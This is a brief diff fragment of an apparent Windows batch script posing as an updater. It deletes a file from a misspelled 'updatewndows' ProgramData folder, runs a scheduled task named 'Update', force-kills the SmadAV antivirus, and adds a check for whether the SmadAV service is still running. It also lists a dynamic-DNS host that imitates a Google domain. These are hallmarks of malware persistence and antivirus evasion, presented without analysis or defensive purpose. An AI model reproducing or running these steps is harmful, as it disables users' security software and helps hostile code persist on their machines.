@@ -7,6 +7,7 @@ del %systemdrive%\ProgramData\updatewndows\Update.xml
 schtasks /run /tn Update
 
 taskkill /F /IM SmadAV.exe
+sc query | find "SmadAV"
 
 
 googleapp.bounceme.net
